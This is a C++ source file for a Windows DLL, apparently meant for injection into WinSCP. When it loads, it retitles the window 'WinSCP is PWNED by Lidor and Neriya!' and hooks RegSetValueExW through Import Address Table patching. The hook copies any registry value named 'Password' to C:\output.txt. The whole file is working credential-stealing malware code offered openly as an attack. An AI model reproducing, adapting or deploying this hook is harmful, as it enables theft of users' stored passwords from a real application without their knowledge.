#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <tchar.h>
#include <string.h>
#include <psapi.h>
#include <strsafe.h>
#include <fstream>


#define BUFSIZE 512
#define IMPORT_TABLE_OFFSET 1


BOOL CALLBACK changeWindowCallBack(const HWND hwnd, const LPARAM lParam)
{
	DWORD outputPid = 0;
	GetWindowThreadProcessId(hwnd, &outputPid);
	const auto pidToSet = *(PDWORD(lParam));
	if (outputPid == pidToSet) 
	{
		SetWindowText(hwnd, "WinSCP is PWNED by Lidor and Neriya!");
	}

	return TRUE;
}


void changeWindowTitle()
{
	auto currentPid = GetCurrentProcessId();
	EnumWindows(changeWindowCallBack, reinterpret_cast<LPARAM>(&currentPid));
}


PIMAGE_IMPORT_DESCRIPTOR getImportTable(const HMODULE hInstance)			
{
	const auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hInstance);
	const auto ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<PBYTE>(dosHeader) + dosHeader->e_lfanew);
	auto optionalHeader = static_cast<IMAGE_OPTIONAL_HEADER>(ntHeader->OptionalHeader);
	const auto dataDirectory = static_cast<IMAGE_DATA_DIRECTORY>(optionalHeader.DataDirectory[IMPORT_TABLE_OFFSET]);
	return reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<PBYTE>(dosHeader) + dataDirectory.VirtualAddress);
}


bool rewriteThunk(const PIMAGE_THUNK_DATA pThunk, void* newFunc)
{
	DWORD currentProtect;
	DWORD junk;
	VirtualProtect(pThunk, 4096, PAGE_READWRITE, &currentProtect);
	pThunk->u1.Function = reinterpret_cast<DWORD>(newFunc);
	VirtualProtect(pThunk, 4096, currentProtect, &junk);
	return true;
}

LSTATUS APIENTRY myRegSetValueExW(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType,	_In_reads_bytes_opt_(cbData) CONST BYTE * lpData, DWORD cbData)
{
	OutputDebugStringW(L"MyRegSetValueExW");
	OutputDebugStringW(lpValueName);

	if (wcscmp(lpValueName, L"Password") == 0)
	{
		OutputDebugStringW(L"MyRegSetValueExW found the password");
		std::ofstream outFile;
		outFile.open("C:\\output.txt", std::ios::binary | std::ios::out | std::fstream::app);
		outFile.write((char*)lpData, cbData);
		outFile.close();
		OutputDebugStringW(L"MyRegSetValueExW done storing");
	}
	return RegSetValueExW(hKey, lpValueName, Reserved, dwType, lpData, cbData);
}


void patchIat(char* funcNameToPatch, void* funcToRunInstead)
{
	const auto currentProcessImageHandle = GetModuleHandleA(nullptr);
	const auto currentProcessImage = reinterpret_cast<PBYTE>(currentProcessImageHandle);
	auto importedModule = getImportTable(currentProcessImageHandle);
	auto doneHooking = false;
	
	while (*reinterpret_cast<PWORD>(importedModule) != 0)
	{
		auto pFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(currentProcessImage + importedModule->FirstThunk);
		auto pOriginalFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(currentProcessImage + importedModule->OriginalFirstThunk);
		auto pFuncData = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(currentProcessImage + pOriginalFirstThunk->u1.AddressOfData);

		const auto currentModuleName = reinterpret_cast<char*>(currentProcessImage + importedModule->Name);
		OutputDebugStringA(currentModuleName);
		
		if (strcmp("ADVAPI32.DLL", currentModuleName) == 0)
		{
			OutputDebugStringA(currentModuleName);
			while (*reinterpret_cast<PWORD>(pFirstThunk) != 0 && *reinterpret_cast<PWORD>(pOriginalFirstThunk) != 0)
			{
				const auto currentFunction = static_cast<char*>(pFuncData->Name);
				OutputDebugStringA(currentFunction);
				if (strcmp(funcNameToPatch, currentFunction) == 0)
				{
					OutputDebugStringW(L"Hooking:");
					OutputDebugStringA(funcNameToPatch);
					if (rewriteThunk(pFirstThunk, funcToRunInstead))
					{
						OutputDebugStringW(L"Patch Successfully");
						doneHooking = true;
						break;
					}
				}

				pOriginalFirstThunk++;
				pFuncData = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(currentProcessImage + pOriginalFirstThunk->u1.AddressOfData);
				pFirstThunk++;
			}
		}

		if(doneHooking)
		{
			break;
		}

		importedModule++; //next module (DLL)
	}

	OutputDebugStringW(L"patchIAT end");
}


BOOL APIENTRY DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
{	
    switch (reason) {
		case DLL_PROCESS_ATTACH:
	    {	    
			OutputDebugStringW(L"DllMain");
			changeWindowTitle();
			patchIat("RegSetValueExW", myRegSetValueExW);
			OutputDebugStringW(L"IATPatching DllMain end");
		}
		default: ;
    }
	
    return TRUE;
}
